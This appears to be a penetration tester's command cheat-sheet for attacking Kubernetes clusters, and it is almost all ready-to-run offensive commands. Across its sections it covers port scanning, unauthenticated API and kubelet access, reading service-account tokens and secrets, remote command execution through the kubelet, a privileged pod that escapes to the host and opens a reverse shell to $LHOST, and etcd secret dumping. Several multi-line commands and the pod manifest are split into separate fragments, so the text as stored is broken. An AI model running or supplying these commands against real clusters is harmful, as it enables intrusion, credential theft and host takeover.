---
id: "a6j9ho2kempsiv9zz"
title: "kubernetes"
description: ""
tags: []
order: "6"
createdAt: "2026-05-30T15:45:13.823Z"
updatedAt: "2026-05-31T09:38:22.104Z"
---

## Reconnaissance
<!-- section: {"id":"u8mwoi572mptl7a4e","order":0,"collapsed":false} -->

### lr3jovx6nmptl7a6v
```bash
nmap -sV -sC -p 6443,8080,8443,10250,10255,2379,2380,30000-32767 $TARGET
```

_Reconnaissance Scan for Kubernetes API and component ports._

**Tags:** kubernetes, recon, nmap
<!-- cmd: {"id":"lr3jovx6nmptl7a6v","language":"bash","sectionId":"u8mwoi572mptl7a4e","tags":["kubernetes","recon","nmap"]} -->

### lfxt8rsrymptl7a71
```bash
rustscan -a $TARGET -p 6443,10250,10255,2379 -- -sV -sC
```

**Tags:** kubernetes, recon, nmap
<!-- cmd: {"id":"lfxt8rsrymptl7a71","language":"bash","sectionId":"u8mwoi572mptl7a4e","tags":["kubernetes","recon","nmap"]} -->

### 215v6lhwomptl7a75
```bash
curl -sk https://$TARGET:6443/version
```

**Tags:** kubernetes, recon, nmap
<!-- cmd: {"id":"215v6lhwomptl7a75","language":"bash","sectionId":"u8mwoi572mptl7a4e","tags":["kubernetes","recon","nmap"]} -->

### 3cainjapsmptl7a7b
```bash
curl -sk https://$TARGET:6443/api
```

**Tags:** kubernetes, recon, nmap
<!-- cmd: {"id":"3cainjapsmptl7a7b","language":"bash","sectionId":"u8mwoi572mptl7a4e","tags":["kubernetes","recon","nmap"]} -->

### s9d2ipugzmptl7a7g
```bash
curl -s http://$TARGET:8080/version     # insecure (old clusters)
```

**Tags:** kubernetes, recon, nmap
<!-- cmd: {"id":"s9d2ipugzmptl7a7g","language":"bash","sectionId":"u8mwoi572mptl7a4e","tags":["kubernetes","recon","nmap"]} -->

## Unauthenticated API Access
<!-- section: {"id":"4742bxyx9mptl7a4l","order":1,"collapsed":false} -->

### 301godmokmptl7a7v
```bash
curl -sk https://$TARGET:6443/api/v1/namespaces
```

_Unauthenticated API Access_

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"301godmokmptl7a7v","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

### d02skpai1mptl7a83
```bash
curl -sk https://$TARGET:6443/api/v1/secrets
```

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"d02skpai1mptl7a83","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

### 1334occi9mptl7a88
```bash
curl -sk https://$TARGET:6443/api/v1/pods
```

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"1334occi9mptl7a88","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

### tax8ghbmomptl7a8d
```bash
curl -sk https://$TARGET:10250/pods | python3 -m json.tool
```

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"tax8ghbmomptl7a8d","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

### peg6z0ncxmptl7a8i
```bash
curl -sk https://$TARGET:10250/exec/$NAMESPACE/$POD/$CONTAINER?command=id&input=1&output=1&tty=1
```

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"peg6z0ncxmptl7a8i","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

### mkx4psyk2mptl7a8m
```bash
curl -s http://$TARGET:10255/pods
```

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"mkx4psyk2mptl7a8m","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

### g592kcb1emptl7a8r
```bash
curl -s http://$TARGET:10255/metrics
```

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"g592kcb1emptl7a8r","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

### l4j0ws05wmptl7a8w
```bash
curl -sk https://$TARGET:2379/v3/keys/
```

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"l4j0ws05wmptl7a8w","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

### v690edhjumptl7a92
```bash
etcdctl --endpoints=https://$TARGET:2379 get / --prefix --keys-only
```

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"v690edhjumptl7a92","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

### wrq9mltj2mptl7a97
```bash
etcdctl --endpoints=https://$TARGET:2379 get /registry/secrets --prefix
```

**Tags:** kubernetes, unauthenticated, api, enumeration
<!-- cmd: {"id":"wrq9mltj2mptl7a97","language":"bash","sectionId":"4742bxyx9mptl7a4l","tags":["kubernetes","unauthenticated","api","enumeration"]} -->

## Authentication & kubectl Setup
<!-- section: {"id":"2tnfrlkkvmptl7a4p","order":2,"collapsed":false} -->

### xh4zcgea0mptl7a9m
```bash
export KUBECONFIG=/tmp/stolen.kubeconfig
```

_Authentication & kubectl Setup_

**Tags:** kubernetes, authentication, kubectl
<!-- cmd: {"id":"xh4zcgea0mptl7a9m","language":"bash","sectionId":"2tnfrlkkvmptl7a4p","tags":["kubernetes","authentication","kubectl"]} -->

### 031aoiqevmptl7a9t
```bash
kubectl get pods
```

**Tags:** kubernetes, authentication, kubectl
<!-- cmd: {"id":"031aoiqevmptl7a9t","language":"bash","sectionId":"2tnfrlkkvmptl7a4p","tags":["kubernetes","authentication","kubectl"]} -->

### 9aret66b2mptl7a9y
```bash
kubectl --server=https://$TARGET:6443 --token=$TOKEN --insecure-skip-tls-verify get pods
```

**Tags:** kubernetes, authentication, kubectl
<!-- cmd: {"id":"9aret66b2mptl7a9y","language":"bash","sectionId":"2tnfrlkkvmptl7a4p","tags":["kubernetes","authentication","kubectl"]} -->

### jgh7o159zmptl7aa4
```bash
kubectl config set-cluster target --server=https://$TARGET:6443 --insecure-skip-tls-verify
```

**Tags:** kubernetes, authentication, kubectl
<!-- cmd: {"id":"jgh7o159zmptl7aa4","language":"bash","sectionId":"2tnfrlkkvmptl7a4p","tags":["kubernetes","authentication","kubectl"]} -->

### wvcuob1a0mptl7aa8
```bash
kubectl config set-credentials hacker --token=$TOKEN
```

**Tags:** kubernetes, authentication, kubectl
<!-- cmd: {"id":"wvcuob1a0mptl7aa8","language":"bash","sectionId":"2tnfrlkkvmptl7a4p","tags":["kubernetes","authentication","kubectl"]} -->

### 5dqvcju3mmptl7aae
```bash
kubectl config set-context pwn --cluster=target --user=hacker
```

**Tags:** kubernetes, authentication, kubectl
<!-- cmd: {"id":"5dqvcju3mmptl7aae","language":"bash","sectionId":"2tnfrlkkvmptl7a4p","tags":["kubernetes","authentication","kubectl"]} -->

### wrjw4dk8hmptl7aak
```bash
kubectl config use-context pwn
```

**Tags:** kubernetes, authentication, kubectl
<!-- cmd: {"id":"wrjw4dk8hmptl7aak","language":"bash","sectionId":"2tnfrlkkvmptl7a4p","tags":["kubernetes","authentication","kubectl"]} -->

### h554ct4twmptl7aap
```bash
kubectl get pods --all-namespaces
```

**Tags:** kubernetes, authentication, kubectl
<!-- cmd: {"id":"h554ct4twmptl7aap","language":"bash","sectionId":"2tnfrlkkvmptl7a4p","tags":["kubernetes","authentication","kubectl"]} -->

## Enumeration (Authenticated)
<!-- section: {"id":"20hxvbty6mptl7a4u","order":3,"collapsed":false} -->

### trr7nubismptl7aay
```bash
kubectl auth can-i --list
```

_Enumeration (Authenticated)_

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"trr7nubismptl7aay","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### 9yukznxjemptl7ab4
```bash
kubectl auth can-i --list --all-namespaces
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"9yukznxjemptl7ab4","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### oa820y41cmptl7aba
```bash
kubectl auth can-i create pods
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"oa820y41cmptl7aba","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### 4yy9ogfykmptl7abf
```bash
kubectl auth can-i get secrets
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"4yy9ogfykmptl7abf","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### pr92bq15smptl7abj
```bash
kubectl auth can-i '*' '*'          # all permissions?
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"pr92bq15smptl7abj","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### 37a0lbi00mptl7abp
```bash
kubectl cluster-info
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"37a0lbi00mptl7abp","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### 1buzyc8semptl7abt
```bash
kubectl get nodes -o wide
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"1buzyc8semptl7abt","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### ir1336thymptl7aby
```bash
kubectl get namespaces
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"ir1336thymptl7aby","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### iuhwb4osvmptl7ac5
```bash
kubectl get all --all-namespaces
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"iuhwb4osvmptl7ac5","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### 4gcudou8gmptl7acb
```bash
kubectl get secrets --all-namespaces
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"4gcudou8gmptl7acb","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### pr3e156ukmptl7acg
```bash
kubectl get secret $SECRET -o jsonpath='{.data}' | python3 -c "import sys,json,base64; d=json.load(sys.stdin); [print(k+': '+base64.b64decode(v).decode()) for k,v in d.items()]"
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"pr3e156ukmptl7acg","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### qv3wej890mptl7acl
```bash
kubectl get serviceaccounts --all-namespaces
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"qv3wej890mptl7acl","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### 5tq7rg34lmptl7acr
```bash
kubectl describe serviceaccount default -n $NAMESPACE
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"5tq7rg34lmptl7acr","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### 68cruwqltmptl7acx
```bash
kubectl get clusterroles
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"68cruwqltmptl7acx","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### 13s5azas7mptl7ad3
```bash
kubectl get clusterrolebindings
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"13s5azas7mptl7ad3","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### aktfgqg7qmptl7ad7
```bash
kubectl describe clusterrolebinding cluster-admin
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"aktfgqg7qmptl7ad7","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### 1zp7e9io9mptl7adc
```bash
kubectl get configmaps --all-namespaces
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"1zp7e9io9mptl7adc","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

### pdr4opu9pmptl7adi
```bash
kubectl describe configmap $CM_NAME -n $NAMESPACE
```

**Tags:** kubernetes, enumeration, authenticated, rbac
<!-- cmd: {"id":"pdr4opu9pmptl7adi","language":"bash","sectionId":"20hxvbty6mptl7a4u","tags":["kubernetes","enumeration","authenticated","rbac"]} -->

## Service Account Token Abuse
<!-- section: {"id":"t0fai2afgmptl7a4z","order":4,"collapsed":false} -->

### lwxofmalcmptl7ae1
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

_Service Account Token Abuse_

**Tags:** kubernetes, serviceaccount, token, exploitation
<!-- cmd: {"id":"lwxofmalcmptl7ae1","language":"bash","sectionId":"t0fai2afgmptl7a4z","tags":["kubernetes","serviceaccount","token","exploitation"]} -->

### 1wlcl8sf1mptl7aea
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

**Tags:** kubernetes, serviceaccount, token, exploitation
<!-- cmd: {"id":"1wlcl8sf1mptl7aea","language":"bash","sectionId":"t0fai2afgmptl7a4z","tags":["kubernetes","serviceaccount","token","exploitation"]} -->

### kobed57vtmptl7aef
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

**Tags:** kubernetes, serviceaccount, token, exploitation
<!-- cmd: {"id":"kobed57vtmptl7aef","language":"bash","sectionId":"t0fai2afgmptl7a4z","tags":["kubernetes","serviceaccount","token","exploitation"]} -->

### 58sdfer73mptl7ael
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

**Tags:** kubernetes, serviceaccount, token, exploitation
<!-- cmd: {"id":"58sdfer73mptl7ael","language":"bash","sectionId":"t0fai2afgmptl7a4z","tags":["kubernetes","serviceaccount","token","exploitation"]} -->

### ghg70f6ssmptl7aep
```bash
APISERVER=https://kubernetes.default.svc
```

**Tags:** kubernetes, serviceaccount, token, exploitation
<!-- cmd: {"id":"ghg70f6ssmptl7aep","language":"bash","sectionId":"t0fai2afgmptl7a4z","tags":["kubernetes","serviceaccount","token","exploitation"]} -->

### o9m19pnafmptl7aev
```bash
curl -s $APISERVER/api/v1/namespaces/ -H "Authorization: Bearer $TOKEN" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

**Tags:** kubernetes, serviceaccount, token, exploitation
<!-- cmd: {"id":"o9m19pnafmptl7aev","language":"bash","sectionId":"t0fai2afgmptl7a4z","tags":["kubernetes","serviceaccount","token","exploitation"]} -->

### ymwtofs64mptl7af0
```bash
curl -s $APISERVER/api/v1/namespaces/$NAMESPACE/secrets -H "Authorization: Bearer $TOKEN" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

**Tags:** kubernetes, serviceaccount, token, exploitation
<!-- cmd: {"id":"ymwtofs64mptl7af0","language":"bash","sectionId":"t0fai2afgmptl7a4z","tags":["kubernetes","serviceaccount","token","exploitation"]} -->

### xndzd1gmamptl7af6
```bash
kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt get pods
```

**Tags:** kubernetes, serviceaccount, token, exploitation
<!-- cmd: {"id":"xndzd1gmamptl7af6","language":"bash","sectionId":"t0fai2afgmptl7a4z","tags":["kubernetes","serviceaccount","token","exploitation"]} -->

## RCE via Kubelet API
<!-- section: {"id":"8idppom35mptl7a54","order":5,"collapsed":false} -->

### t951q3d53mptl7afr
```bash
curl -sk https://$TARGET:10250/pods | python3 -m json.tool | grep '"name"'
```

_RCE via Kubelet API Execute commands in pods via unauthenticated Kubelet._

**Tags:** kubernetes, kubelet, rce, exploitation
<!-- cmd: {"id":"t951q3d53mptl7afr","language":"bash","sectionId":"8idppom35mptl7a54","tags":["kubernetes","kubelet","rce","exploitation"]} -->

### jp9htnoqlmptl7afw
```bash
curl -sk https://$TARGET:10250/run/$NAMESPACE/$POD/$CONTAINER \
```

**Tags:** kubernetes, kubelet, rce, exploitation
<!-- cmd: {"id":"jp9htnoqlmptl7afw","language":"bash","sectionId":"8idppom35mptl7a54","tags":["kubernetes","kubelet","rce","exploitation"]} -->

### bs0e05bgmmptl7ag1
```bash
-d "cmd=id"
```

**Tags:** kubernetes, kubelet, rce, exploitation
<!-- cmd: {"id":"bs0e05bgmmptl7ag1","language":"bash","sectionId":"8idppom35mptl7a54","tags":["kubernetes","kubelet","rce","exploitation"]} -->

### 2vw5qetuzmptl7ag5
```bash
kubeletctl -s $TARGET pods
```

**Tags:** kubernetes, kubelet, rce, exploitation
<!-- cmd: {"id":"2vw5qetuzmptl7ag5","language":"bash","sectionId":"8idppom35mptl7a54","tags":["kubernetes","kubelet","rce","exploitation"]} -->

### u6ptywnopmptl7aga
```bash
kubeletctl -s $TARGET exec "id" -p $POD -c $CONTAINER -n $NAMESPACE
```

**Tags:** kubernetes, kubelet, rce, exploitation
<!-- cmd: {"id":"u6ptywnopmptl7aga","language":"bash","sectionId":"8idppom35mptl7a54","tags":["kubernetes","kubelet","rce","exploitation"]} -->

### 6l94sc56nmptl7agf
```bash
kubeletctl -s $TARGET scan rce
```

**Tags:** kubernetes, kubelet, rce, exploitation
<!-- cmd: {"id":"6l94sc56nmptl7agf","language":"bash","sectionId":"8idppom35mptl7a54","tags":["kubernetes","kubelet","rce","exploitation"]} -->

## Malicious Pod Deployment
<!-- section: {"id":"8oqdy4kmemptl7a59","order":6,"collapsed":false} -->

### n2kviziw9mptl7ah6
```bash
cat <<EOF | kubectl apply -f -
```

_Malicious Pod Deployment Create a privileged pod to escape to host._

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"n2kviziw9mptl7ah6","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### 9saiim6eomptl7ahc
```bash
apiVersion: v1
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"9saiim6eomptl7ahc","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### em3ozare6mptl7ahh
```bash
kind: Pod
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"em3ozare6mptl7ahh","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### 6u8g0rrv9mptl7ahm
```bash
metadata:
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"6u8g0rrv9mptl7ahm","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### cgkinoi1amptl7ahq
```bash
name: pwn
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"cgkinoi1amptl7ahq","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### mhzl9aij5mptl7ahw
```bash
namespace: default
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"mhzl9aij5mptl7ahw","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### 6hhzbyoy2mptl7ai1
```bash
spec:
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"6hhzbyoy2mptl7ai1","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### xsqq5cww5mptl7ai6
```bash
hostPID: true
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"xsqq5cww5mptl7ai6","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### ruga04t29mptl7aib
```bash
hostIPC: true
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"ruga04t29mptl7aib","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### unrab0th6mptl7aif
```bash
hostNetwork: true
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"unrab0th6mptl7aif","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### mfsmnbljimptl7aik
```bash
containers:
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"mfsmnbljimptl7aik","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### goosz1jipmptl7aiq
```bash
- name: pwn
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"goosz1jipmptl7aiq","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### 8j3dt3po4mptl7aiv
```bash
image: alpine
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"8j3dt3po4mptl7aiv","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### eqs0y1hjrmptl7aiz
```bash
command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -- bash -i >& /dev/tcp/$LHOST/4444 0>&1"]
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"eqs0y1hjrmptl7aiz","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### w45tvreximptl7aj4
```bash
securityContext:
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"w45tvreximptl7aj4","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### 2fi3b61nhmptl7aj9
```bash
privileged: true
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"2fi3b61nhmptl7aj9","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### mdhdvl5ocmptl7ajf
```bash
volumeMounts:
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"mdhdvl5ocmptl7ajf","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### lbp3vt60tmptl7ajl
```bash
- mountPath: /host
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"lbp3vt60tmptl7ajl","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### b9xo92rjumptl7ajq
```bash
name: host-vol
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"b9xo92rjumptl7ajq","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### r2edlpcolmptl7ajv
```bash
volumes:
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"r2edlpcolmptl7ajv","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### v7zr05puymptl7ak0
```bash
- name: host-vol
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"v7zr05puymptl7ak0","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### djb3uqt8zmptl7ak6
```bash
hostPath:
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"djb3uqt8zmptl7ak6","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### 2pxdfyy50mptl7akb
```bash
path: /
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"2pxdfyy50mptl7akb","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### ji29qrq4dmptl7akh
```bash
restartPolicy: Never
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"ji29qrq4dmptl7akh","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### x24y7tdkmmptl7akl
```bash
EOF
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"x24y7tdkmmptl7akl","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### wlnu5ol3omptl7akq
```bash
kubectl exec -it pwn -- nsenter -t 1 -m -u -i -n bash
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"wlnu5ol3omptl7akq","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

### r2v6k8pismptl7akw
```bash
kubectl exec -it pwn -- chroot /host bash
```

**Tags:** kubernetes, pod, privesc, container-escape, exploitation
<!-- cmd: {"id":"r2v6k8pismptl7akw","language":"bash","sectionId":"8oqdy4kmemptl7a59","tags":["kubernetes","pod","privesc","container-escape","exploitation"]} -->

## etcd — Secret Extraction
<!-- section: {"id":"63i9yff39mptl7a5e","order":7,"collapsed":false} -->

### xw66hco9lmptl7alk
```bash
etcdctl --endpoints=https://$TARGET:2379 \
```

_etcd — Secret Extraction_

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"xw66hco9lmptl7alk","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### bo347ynrrmptl7alr
```bash
--cacert=/etc/kubernetes/pki/etcd/ca.crt \
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"bo347ynrrmptl7alr","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### zjhv4fotbmptl7aly
```bash
--cert=/etc/kubernetes/pki/etcd/server.crt \
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"zjhv4fotbmptl7aly","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### tgwzte3o1mptl7am3
```bash
--key=/etc/kubernetes/pki/etcd/server.key \
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"tgwzte3o1mptl7am3","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### kk0f3y81omptl7am8
```bash
get / --prefix --keys-only
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"kk0f3y81omptl7am8","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### zjghgptoemptl7ame
```bash
etcdctl --endpoints=https://$TARGET:2379 \
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"zjghgptoemptl7ame","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### b0v3qvzi3mptl7amj
```bash
--cacert=/etc/kubernetes/pki/etcd/ca.crt \
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"b0v3qvzi3mptl7amj","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### k19n3wt1imptl7amo
```bash
--cert=/etc/kubernetes/pki/etcd/server.crt \
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"k19n3wt1imptl7amo","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### 11y6zcpn0mptl7amt
```bash
--key=/etc/kubernetes/pki/etcd/server.key \
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"11y6zcpn0mptl7amt","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### e25rp7cmjmptl7an0
```bash
get /registry/secrets --prefix | strings | grep -A2 "password\|secret\|token"
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"e25rp7cmjmptl7an0","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

### sgru1kvhmmptl7ana
```bash
etcdctl --endpoints=https://$TARGET:2379 get /registry/serviceaccounts --prefix | strings
```

**Tags:** kubernetes, etcd, secrets, exploitation
<!-- cmd: {"id":"sgru1kvhmmptl7ana","language":"bash","sectionId":"63i9yff39mptl7a5e","tags":["kubernetes","etcd","secrets","exploitation"]} -->

## RBAC Abuse
